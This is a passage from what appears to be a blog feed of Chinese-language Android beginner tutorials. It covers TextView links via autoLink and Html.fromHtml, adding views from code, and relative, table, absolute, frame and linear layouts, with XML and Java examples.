<p>我们注意<code>android:autoLink=&quot;all&quot;</code>这个东西就是一个配置富文本框的一个属性，可以有下面这几个值：<br><em>设置是否当文本为URL链接/email/电话号码/map时，文本显示为可点击的链接。可选值(none/web/email/phone/map/all)</em><br>我们这里填写all就是所有的，而且之个东西支持HTML5的代码。<br>看我们的代码是如何编写的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> TextView Tv_One;</span><br><span class="line"><span class="keyword">private</span> TextView Tv_Two;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">	setContentView(R.layout.activity_main);</span><br><span class="line">	Tv_One = (TextView) findViewById(R.id.Tv_One);</span><br><span class="line">	Tv_Two = (TextView) findViewById(R.id.Tv_Two);</span><br><span class="line">	String text1 = <span class="string">"&lt;font color = 'red'&gt;Hello Wker&lt;/font&gt;"</span>;</span><br><span class="line">	text1 += <span class="string">"&lt;a href = 'https://www.baidu.com'&gt;百度&lt;/a&gt;"</span>;</span><br><span class="line">	Tv_One.setText(Html.fromHtml(text1));</span><br><span class="line">	Tv_One.setMovementMethod(LinkMovementMethod.getInstance());<span class="comment">//产生链接的效果</span></span><br><span class="line">	Tv_Two.setMovementMethod(LinkMovementMethod.getInstance());<span class="comment">//产生链接的效果</span></span><br><span class="line">	Tv_Two.setText(<span class="string">"MyWeb:https://www.baidu.com 我的电话：13131313131"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们获取了这两个控件，然后我们配置一个HTML的一个语句，简单的就可以了，然后我们通过<code>Html.fromHtml(text1)</code>来获取一个Spanned的一个值，这个值就是实现了CharSquence接口，我们将它传过去，然后在设置可以产生连接，这个方法就是这么用，设置好之后我们就可以看一下效果：<br><img src="img1.jpg" alt="效果图"><br>但是需要注意的是我们之后XML中进行配置了我们才能可以解析，不配置的话呢只能解析一些简单的电话号网站之类的。并且当我们点击了蓝色的这些东西之后我们就能跳转到我们想要的地方去。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android View</title>
    <url>/2020/02/01/Android-View/</url>
    <content><![CDATA[<h2 id="Android视图"><a href="#Android视图" class="headerlink" title="Android视图"></a>Android视图</h2><p>其实看到的这些空间就是一些View所派生出来的东西，包括这些布局也是派生出来的，但是布局所派生的直接父类是ViewGroup类，这个类支持添加View对象。<br>下面看一个实例。<br>首先看一下我的Layout XML。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingBottom</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingLeft</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingRight</span>=<span class="string">"@dimen/activity_horizontal_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:paddingTop</span>=<span class="string">"@dimen/activity_vertical_margin"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">"com.example.android_stduy1.MainActivity"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我并没有添加任何的组件，我们现在要通过代码的方式进行添加。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_stduy1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.ActionBar.LayoutParams;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Color;</span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.text.Layout;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.widget.RelativeLayout;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		View MainLayOut = View.inflate(<span class="keyword">this</span>, R.layout.activity_main, <span class="keyword">null</span>);</span><br><span class="line">		</span><br><span class="line">		TextView textView = <span class="keyword">new</span> TextView(<span class="keyword">this</span>);</span><br><span class="line">		LayoutParams layoutPar = <span class="keyword">new</span> LayoutParams(LayoutParams.MATCH_PARENT,LayoutParams.WRAP_CONTENT);</span><br><span class="line">		textView.setLayoutParams(layoutPar);</span><br><span class="line">		textView.setBackgroundColor(Color.GREEN);</span><br><span class="line">		textView.setText(<span class="string">"Hellow Word"</span>);</span><br><span class="line">		((ViewGroup)MainLayOut).addView(textView);</span><br><span class="line">		setContentView(MainLayOut);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></span><br><span class="line">		getMenuInflater().inflate(R.menu.main, menu);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Handle action bar item clicks here. The action bar will</span></span><br><span class="line">		<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></span><br><span class="line">		<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></span><br><span class="line">		<span class="keyword">int</span> id = item.getItemId();</span><br><span class="line">		<span class="keyword">if</span> (id == R.id.action_settings) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们这里没有使用哪个自带的加载布局的方式。</p>
<p>首先我们先new一个View的对象通过View类的一个静态方法inflate。<br>*<em>public View inflate ()<br>加载getLayoutResource()方法标识的布局资源，并通过加载布局资源替换父容器中它自己。<br>返回值：这个已加载的布局资源文件. *</em><br>这是一个API文档解释的。<br>反正这个东西就是返回一个加载的布局资源。<br>第一个参数就是一个设备上下文，我们用自身就好了，第二个就是一个资源ID，第三个暂时不是很清楚，但是写null也是可以的。<br>加载完布局资源之后，我们new一个TextView对象，就像我们在XML文件中进行设置的，我们也需要一个控件的布局，那就是我们需要一个LayoutParams对象，这个对象其实就是一个控件布局的一个对象，我们在构造方法中需要传入一个坐标类型的，就和我们在XML中设置的一样，我们使用这个类里面的一个常量就可以设置这个对象了。<br>然后在将我们的TextView设置这个布局，设置完毕之后我们简单的设置一下这个TextView对象，然后下面就是比较关键的一步了，我们需要将我们的控件添加到我们的LayOut中，但是由于我们的布局是View的对象我们需要进行强制转换成为ViewGroup类型的，这个时候我们才拥有了addView方法（其实转换成布局也是可以的），最后我们将我们的布局添加到我们的上下文对象中就可以了。<br>效果图：<br><img src="img1.jpg" alt="效果图"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android相对布局</title>
    <url>/2020/02/01/Android%E7%9B%B8%E5%AF%B9%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h2 id="相对布局"><a href="#相对布局" class="headerlink" title="相对布局"></a>相对布局</h2><p>相对布局还是很好用的，其实就是一个组件相对于另外一个组件的一个位置，我们只需要定好一个位置我们就可以推出来其他的位置。但是有一点就是需要注意的，由于我们需要相对性，所以我们需要ID，因此XML解析是需要顺序的，就是说我们如果这个控件是相对于那个控件的，那个控件就需要在我这个控件之前进行定义！<br>看一下示例代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">RelativeLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"fill_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/iv_icon"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"70dp"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"70dp"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/et_account"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"180dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"请输入账号"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_toRightOf</span>=<span class="string">"@id/iv_icon"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/et_password"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"180dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"请输入密码"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_below</span>=<span class="string">"@id/et_account"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_toRightOf</span>=<span class="string">"@id/iv_icon"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/register"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"注册账号"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/et_account"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_marginTop</span>=<span class="string">"15dip"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/returnPassword"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"找回密码"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/et_account"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_marginTop</span>=<span class="string">"45dip"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">CheckBox</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/remember"</span></span></span><br><span class="line"><span class="tag">   	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"记住密码"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/iv_icon"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_below</span>=<span class="string">"@id/et_password"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">CheckBox</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/auto_Login"</span></span></span><br><span class="line"><span class="tag">   	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"自动登录"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/remember"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_below</span>=<span class="string">"@id/et_password"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/Login"</span></span></span><br><span class="line"><span class="tag">    	<span class="attr">android:layout_width</span>=<span class="string">"300dip"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"登录"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_below</span>=<span class="string">"@id/auto_Login"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_centerHorizontal</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">	    /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>模仿QQ的一个登录界面</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android表格布局和绝对布局</title>
    <url>/2020/02/01/Android%E8%A1%A8%E6%A0%BC%E5%B8%83%E5%B1%80%E5%92%8C%E7%BB%9D%E5%AF%B9%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h2 id="表格布局"><a href="#表格布局" class="headerlink" title="表格布局"></a>表格布局</h2><p>这个布局不怎么用，我感觉不是很好用，就是有很多Row（行），每一行自己添加控件，就是这个样子：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TableLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TableRow</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">   		 <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">             <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:text</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:gravity</span>=<span class="string">"center_horizontal"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">             <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:text</span>=<span class="string">"2"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:gravity</span>=<span class="string">"center_horizontal"</span></span></span><br><span class="line"><span class="tag">   			 <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">TableRow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">TableLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>就是这个样子，<code>android:gravity=&quot;center_horizontal&quot;</code>这个就是居中显示。</p>
<h2 id="绝对布局"><a href="#绝对布局" class="headerlink" title="绝对布局"></a>绝对布局</h2><p>这个布局就是我们常见的Win32应用程序用的，我感觉挺好用的，但是他们说不怎么用，可能APP开发是有一定的特殊性的。很简单这个布局，就是拖拉控件，只有XY这两个属性比较重要。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">AbsoluteLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_x</span>=<span class="string">"12dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_y</span>=<span class="string">"18dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Button"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">AbsoluteLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个样子就可以了。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android框架布局</title>
    <url>/2020/02/01/Android%E6%A1%86%E6%9E%B6%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h2 id="框架布局"><a href="#框架布局" class="headerlink" title="框架布局"></a>框架布局</h2><p>这个布局其实还是很简单的，就是一个栈类型的窗口重叠效果，就是最后加入的窗口在最顶层，先加入的在最底层。<br>在我们的LayoutXML中进行设置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FrameLayout</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"220dip"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">             <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	   		 <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	   		 <span class="attr">android:src</span>=<span class="string">"@drawable/ic_test"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/iv_play"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"35dip"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"35dip"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_marginTop</span>=<span class="string">"185dip"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_gravity</span>=<span class="string">"bottom"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_marginBottom</span>=<span class="string">"30dip"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:visibility</span>=<span class="string">"visible"</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span> /&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- gone和invisible的区别就是前者是直接删除，后者只是隐藏 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/btn_play"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">"播放"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/btn_pause"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">"暂停"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">          </span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里简单的介绍一下，就是说这个<code>layout_marginTop</code>就是一个距离顶部的距离，<code>layout_gravity</code>就是一个位置，<code>layout_marginBottom</code>这个也是一个距底部的位置，这个的话呢先要设置<code>layout_gravity</code>才可以。<br>然后我们可以这么写代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.ImageView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Button bu1;</span><br><span class="line">	<span class="keyword">private</span> Button bu2;</span><br><span class="line">	<span class="keyword">private</span> ImageView im1;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_2);</span><br><span class="line">		bu1 = (Button) findViewById(R.id.btn_play);</span><br><span class="line">		bu2 = (Button) findViewById(R.id.btn_pause);</span><br><span class="line">		im1 = (ImageView) findViewById(R.id.iv_play);</span><br><span class="line">		bu1.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">				im1.setVisibility(View.VISIBLE);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">		bu2.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">				im1.setVisibility(View.INVISIBLE);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就可以实现一个对应性的图片展示与显示了。<br>发现原来在添加图片的时候我们是不能有大写的，这个需要注意，刚发现的。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android线性布局</title>
    <url>/2020/02/01/Android%E7%BA%BF%E6%80%A7%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h2 id="线性布局"><a href="#线性布局" class="headerlink" title="线性布局"></a>线性布局</h2><p>这个布局就是生成一个新的Activity时自动生成的一个布局，也就是：<code>LinearLayout</code>布局，这个布局称之为线性布局，比较的简单，比如下面代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 